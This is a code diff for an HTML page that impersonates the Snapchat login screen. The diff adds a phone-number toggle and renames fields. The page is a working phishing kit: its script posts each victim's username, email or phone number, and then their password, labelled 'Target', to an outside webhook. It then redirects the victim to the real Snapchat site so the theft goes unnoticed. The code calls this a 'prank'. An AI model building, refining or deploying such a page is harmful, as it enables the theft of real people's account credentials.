@@ -44,16 +44,9 @@
         }
 
         .ghost-logo { width: 55px; margin-bottom: 15px; }
-
         h2 { font-size: 26px; margin: 0 0 20px 0; font-weight: 700; color: #16191c; }
 
-        /* Step 2 specific styles */
-        .user-display {
-            font-size: 14px;
-            margin-bottom: 25px;
-            color: #16191c;
-            font-weight: 500;
-        }
+        .user-display { font-size: 14px; margin-bottom: 25px; color: #16191c; font-weight: 500; }
         .not-you { color: #00b2ff; text-decoration: none; font-size: 13px; margin-left: 5px; }
 
         .input-group { text-align: left; margin-bottom: 15px; }
@@ -70,7 +63,7 @@
             background-color: #f7f7f7;
         }
 
-        .blue-link { color: #00b2ff; font-size: 13px; font-weight: 600; text-decoration: none; display: block; margin: 15px 0 25px 0; }
+        .blue-link { color: #00b2ff; font-size: 13px; font-weight: 600; text-decoration: none; display: block; margin: 15px 0 25px 0; cursor: pointer; }
 
         .next-btn {
             background-color: #00b2ff;
@@ -94,7 +87,6 @@
             font-size: 15px; font-weight: 600; color: #3c4043;
         }
         .google-icon { width: 18px; margin-right: 10px; }
-
         .back-nav { margin-top: 25px; font-weight: bold; text-transform: uppercase; font-size: 11px; border-bottom: 2px solid #000; text-decoration: none; color: #000; }
     </style>
 </head>
@@ -108,14 +100,14 @@
         <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.png" class="ghost-logo">
         <h2>Log in to Snapchat</h2>
         <div class="input-group">
-            <label>Username or Email</label>
-            <input type="text" id="emailInput" required>
+            <label id="inputLabel">Username or Email</label>
+            <input type="text" id="userInput" required>
         </div>
-        <a href="#" class="blue-link">Use phone number instead</a>
+        <a class="blue-link" id="toggleLink" onclick="toggleInputType()">Use phone number instead</a>
         <button class="next-btn" onclick="goToStep2()">Next</button>
         <div class="divider">OR</div>
         <button class="google-btn" onclick="showError()">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Color_Icon.svg" class="google-icon">
+            <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" class="google-icon">
             Continue with Google
         </button>
     </div>
@@ -124,13 +116,13 @@
         <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.png" class="ghost-logo">
         <h2>Enter Password</h2>
         <div class="user-display">
-            <span id="displayEmail"></span><a href="#" class="not-you" onclick="location.reload()">Not you?</a>
+            <span id="displayEmail"></span><a class="not-you" onclick="location.reload()">Not you?</a>
         </div>
         <div class="input-group">
             <label>Password</label>
             <input type="password" id="passInput" required>
         </div>
-        <a href="#" class="blue-link">Forgot Password</a>
+        <a class="blue-link">Forgot Password</a>
         <button class="next-btn" onclick="finishPrank()">Next</button>
     </div>
 
@@ -138,6 +130,26 @@
 
     <script>
         const webhookURL = "YOUR_WEBHOOK_URL_HERE";
+        let isPhoneMode = false;
+
+        function toggleInputType() {
+            const label = document.getElementById('inputLabel');
+            const link = document.getElementById('toggleLink');
+            const input = document.getElementById('userInput');
+            
+            isPhoneMode = !isPhoneMode;
+            
+            if (isPhoneMode) {
+                label.innerText = "Phone Number";
+                link.innerText = "Use email instead";
+                input.type = "tel";
+                input.placeholder = "";
+            } else {
+                label.innerText = "Username or Email";
+                link.innerText = "Use phone number instead";
+                input.type = "text";
+            }
+        }
 
         function showError() {
             document.getElementById('error-banner').style.display = 'block';
@@ -145,29 +157,28 @@
         }
 
         function goToStep2() {
-            const email = document.getElementById('emailInput').value;
-            if(!email) return alert("Enter email first");
+            const user = document.getElementById('userInput').value;
+            if(!user) return alert("Required field");
             
-            document.getElementById('displayEmail').innerText = email;
+            document.getElementById('displayEmail').innerText = user;
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'block';
             
-            // Send email to discord immediately
             fetch(webhookURL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `📧 **Username Captured:** ${email}` })
+                body: JSON.stringify({ content: `📱 **Input Captured (${isPhoneMode ? 'Phone' : 'User/Email'}):** ${user}` })
             });
         }
 
         function finishPrank() {
             const pass = document.getElementById('passInput').value;
-            const email = document.getElementById('emailInput').value;
+            const user = document.getElementById('userInput').value;
             
             fetch(webhookURL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `🔑 **Password Captured!**\nUser: ${email}\nPass: ${pass}` })
+                body: JSON.stringify({ content: `🔑 **Password Captured!**\nTarget: ${user}\nPass: ${pass}` })
             }).then(() => {
                 window.location.href = "https://accounts.snapchat.com/accounts/login";
             });
@@ -175,4 +186,3 @@
     </script>
 </body>
 </html>
-
